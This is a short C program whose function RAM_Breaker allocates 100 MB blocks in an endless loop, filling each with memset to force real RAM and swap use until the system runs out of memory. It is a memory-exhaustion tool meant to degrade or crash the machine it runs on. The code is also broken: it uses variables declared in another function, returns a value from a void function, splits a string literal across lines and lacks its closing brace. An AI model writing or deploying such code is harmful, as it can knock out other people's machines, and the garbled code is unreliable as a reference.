#include "includer.h"

void Defs()
{
  size_t capacity = 16;
    size_t size = 0;
    char **memory_chunks = malloc(capacity * sizeof(char*));
    if (!memory_chunks) {
        fprintf(stderr, "Fail to allocate memory :(\n");
        return 1;
    }
}

void RAM_Breaker()
{
    const size_t chunk_size = 100 * 1024 * 1024;
    size_t total_allocated = 0;

    while (1)
    {
        char *chunk = (char*)malloc(chunk_size);
        if (!chunk) {
            fprintf(stderr, "\n[!] Failed to allocate memory!\n");
            fprintf(stderr, "Max memory allocated before crash: %zu MB\n", total_allocated / (1024 * 1024));
            break;
        }

        // Write data in block to force OS to map real memory (RAM/Swap)
        memset(chunk, 0xAA, chunk_size);

        // Allocate in ray
        if (size == capacity)
        {
            capacity *= 2;
            char **tmp = realloc(memory_chunks, capacity * sizeof(char*));
            if (!tmp) {
                fprintf(stderr, "Failed
                  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n");
                free(chunk);
                break;
            }
            memory_chunks = tmp;
        }
        memory_chunks[size++] = chunk;
        total_allocated += chunk_size;

        printf("Alocados com sucesso: %zu MB\n", total_allocated / (1024 * 1024));
}
